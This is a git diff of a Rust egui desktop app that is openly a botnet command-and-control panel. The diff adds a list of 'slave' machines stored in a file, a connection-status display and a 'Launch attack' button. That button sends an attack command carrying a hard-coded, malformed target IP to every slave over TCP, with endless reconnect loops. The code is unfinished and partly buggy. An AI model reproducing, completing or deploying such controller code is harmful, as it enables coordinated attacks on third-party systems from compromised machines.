@@ -12,9 +12,6 @@ fn is_a_valid_ip(ip: &str) -> bool {
     re.is_match(ip)
 }
 
-
-
-
 /// We derive Deserialize/Serialize so we can persist app state on shutdown.
 #[derive(serde::Deserialize, serde::Serialize)]
 #[serde(default)] // if we add new fields, give them default values when deserializing old state
@@ -39,8 +36,8 @@ impl Default for TemplateApp {
             ip_target: "127.0.0.1:8080".to_owned(),
             ip_new_slave: "137.194.33.11".to_owned(),
             value: 2.7, 
-            vec_ip: vec![String::from("128.0.0.1:8080")],
-            vec_state: vec![String::from("Unknown")],
+            vec_ip: vec![],//
+            vec_state: vec![],
         }
     }
 }
@@ -165,6 +162,7 @@ impl eframe::App for TemplateApp {
                         */
 
                         //refresh closure
+                        /*
                         let mut refresh_slaves = || {
                             //show slaves definition
                             let mut number_of_connected_slaves : i32 = 0;
@@ -202,6 +200,7 @@ impl eframe::App for TemplateApp {
                                 });
                             }
                         };
+                        */
                         
                         ui.heading("Show current slaves");
                         if ui.button("refresh").clicked(){
@@ -210,12 +209,15 @@ impl eframe::App for TemplateApp {
                             let mut number_of_connected_slaves : i32 = 0;
                             let mut number_of_disconnected_slaves : i32 = 0;
                             let res = read_string_from_file("./src/slaves.txt").unwrap();
-                            let mut vec_ip : Vec<String> = Vec::new();
-                            let mut vec_state : Vec<String> = Vec::new();
+                            //let mut vec_ip : Vec<String> = Vec::new();
+                            vec_ip.clear();
+                            vec_state.clear();
+                            //let mut vec_state : Vec<String> = Vec::new();
                             let mut counter = 0;
                             for line in res.lines() {
                                 let mut state : &str;
                                 match TcpStream::connect(line.clone()){
+                                //match TcpStream::connect_timeout(line.clone(), Duration::from_millis(300)){
                                     Ok(_) =>{
                                         number_of_connected_slaves += 1;
                                         state = "connected";
@@ -233,18 +235,36 @@ impl eframe::App for TemplateApp {
                             unsafe{number_of_slaves = counter};
                         
                             println!("{:?}", vec_ip);
-                            println!("{:?}", vec_state);
+                            //println!("{:?}", vec_state);
 
-                            
-                            for i in 0..vec_ip.len(){
-                                ui.horizontal(|ui| {
-                                    ui.label(RichText::new(vec_ip.get(i).unwrap()));
-                                    ui.label(RichText::new("-"));
-                                    ui.label(RichText::new(vec_state.get(i).unwrap()).color(Color32::RED));
-                                });
+                            //reset all connections
+                            /*
+                            for e in vec_ip.clone(){
+                                connect_to_slave(&e);
                             }
-                            
+                            */
+
                         };
+
+                        for i in 0..vec_ip.len(){
+                            ui.horizontal(|ui| {
+                                ui.label(vec_ip.get(i).unwrap());
+                                ui.label(RichText::new("-"));
+                                let state : String;// = vec_state.get(i).unwrap();
+                                match vec_state.get(i){
+                                    Some(s) =>{
+                                        state = s.to_string();
+                                    },
+                                    None =>{
+                                        state = String::from("Unknown");
+                                    }
+                                };
+                                ui.label(
+                                    if &state=="disconnected" {RichText::new(&state.clone()).color(Color32::RED)}
+                                    else {RichText::new(&state.clone()).color(Color32::GREEN)}
+                                );
+                            });
+                        }
                         
                     },
                     "slaves_add" =>{
@@ -257,6 +277,7 @@ impl eframe::App for TemplateApp {
                         if ui.button("add slave").clicked(){
                             if is_a_valid_ip(ip_new_slave){
                                 println!("Adding slave {}", ip_new_slave);
+                                write_string_to_file(ip_new_slave, "./src/slaves.txt");
                             }
                             else{
                                 println!("Invalid IP address");
@@ -275,6 +296,9 @@ impl eframe::App for TemplateApp {
                         if ui.button("Launch attack").clicked(){
                             if is_a_valid_ip(ip_target){
                                 println!("Launching attack on {}", ip_target);
+                                for e in vec_ip.clone(){
+                                    launch_attack(&e);
+                                }
                             }
                             else{
                                 println!("Invalid IP address");
@@ -283,12 +307,7 @@ impl eframe::App for TemplateApp {
                         unsafe{slave_list_frame_changed=true;};
                     },
                     _ =>{
-                        ui.heading("eframe DEFAULT");
-                        //ui.hyperlink("https://github.com/emilk/eframe_template");
-                        ui.add(egui::github_link_file!(
-                            "https://github.com/emilk/eframe_template/blob/master/",
-                            "127.0.0.1:8080 - connected"
-                        ));
+                        ui.heading("Botnet");
                         unsafe{slave_list_frame_changed=true;};
                     }
                 }
@@ -310,7 +329,7 @@ impl eframe::App for TemplateApp {
 /********************************BACKEND***********************************/
 
 
-use std::{net::TcpStream, io::{Write, Read, self}, fs::{self, File, OpenOptions}, ops::Add, os::windows::prelude::AsSocket, time::Duration};//, error::Error};
+use std::{net::{TcpStream, SocketAddr, SocketAddrV4}, io::{Write, Read, self}, fs::{self, File, OpenOptions}, ops::Add, os::windows::prelude::AsSocket, time::Duration};//, error::Error};
 use easyinput::input;
 use std::thread;
 use serde::{Serialize, Deserialize, de::Error};
@@ -327,14 +346,14 @@ static mut counter_disonnectuon: u128 = 0;
 static mut retry: bool = false;
 static mut command__: String = String::new();
 
-fn connect_to_slave(socket: &str){
+fn launch_attack(socket: &str){
     let mut is_connected = false;
 
     let mut isGood = true;
     let mut command_ = String::from("");
 
     while !is_connected {
-        match TcpStream::connect("127.0.0.1:8080"){
+        match TcpStream::connect(socket){ //"127.0.0.1:8080"
             Ok(stream) => {
                 println!("ok");
                 is_connected = true;
@@ -348,7 +367,90 @@ fn connect_to_slave(socket: &str){
 
                 //let vec_id = read_vec_from_file("./src/uuid.txt");
 
+                unsafe{
+                    let mut retry_cln : bool = retry.clone();
+                    let handle_write = thread::spawn(move ||{
+                        let mut stream_write = stream_write.try_clone().unwrap();
+                        unsafe{
+                            println!("eeooo : {}", retry_cln);
+                            if retry_cln==true{
+                                println!("j'ai retry!!!");
+                                handle_connection(&mut stream_write, command__.clone());
+                                retry_cln = false;
+                            };
+                        }
+                        let command: String = String::from("00002:137.913.133.11");
+                        let isGood = handle_connection(&mut stream_write, command.clone());
+                        if !isGood{
+                            println!("erreur bro, string = {}", command);
+                            return (true, command);
+                            //handle_connection(&mut stream_write, command.clone());
+                        }else{
+                            return (false, command); //Why ?
+                        }
+                        /*
+                        loop{
+                            let command: String = input("command: ");
+                            let isGood = handle_connection(&mut stream_write, command.clone());
+                            if !isGood{
+                                println!("erreur bro, string = {}", command);
+                                return (true, command);
+                                //handle_connection(&mut stream_write, command.clone());
+                            }
+                        }
+                        */
+                    });
+
+                    let value_returned_by_thread_write = handle_write.join().unwrap();
+                    if value_returned_by_thread_write.0==true{
+                        unsafe{
+                            retry = true;
+                            command__ = value_returned_by_thread_write.1.clone();
+                            println!("command__ = {}", command__.clone().as_str());
+                        };
+                        launch_attack("127.0.0.1:8080");
+                        //return;
+                    }
+
+                };
+
+                let handle_read = thread::spawn(move ||{
+                    let stream_read = stream_read.try_clone().unwrap();
+                    read(&stream_read);
+                });
                 
+                _ = handle_read.join();
+            },
+            Err(error) => {
+                println!("nouvelle tentative");
+                continue
+            },
+        };
+    }
+}
+
+/*
+fn connect_to_slave(socket: &str){
+    let mut is_connected = false;
+
+    let mut isGood = true;
+    let mut command_ = String::from("");
+
+    while !is_connected {
+        match TcpStream::connect(socket){ //"127.0.0.1:8080"
+            Ok(stream) => {
+                println!("ok");
+                is_connected = true;
+                print!("Enfin !");
+
+                let stream_read = stream.try_clone().unwrap();
+                let mut stream_write = stream.try_clone().unwrap();
+
+                println!("c'est executé pourtant");
+                handle_connection(&mut stream_write, String::from("00001").add(":"));
+
+                //let vec_id = read_vec_from_file("./src/uuid.txt");
+
                 unsafe{
                     let mut retry_cln : bool = retry.clone();
                     let handle_write = thread::spawn(move ||{
@@ -399,7 +501,7 @@ fn connect_to_slave(socket: &str){
         };
     }
 }
-
+*/
 fn write_string_to_file(string: &str, path: &str) {
     // Open the file at the specified path with append mode
     let mut file = match OpenOptions::new().append(true).open(path) {
@@ -631,7 +733,8 @@ fn read(stream : &TcpStream){
                 },
                 Err(e) =>{
                     //We have to reconnect
-                    connect_to_slave("127.0.0.1:8080");
+                    //connect_to_slave("127.0.0.1:8080");
+                    launch_attack("127.0.0.1:8080");
                     break;
                 }
             };
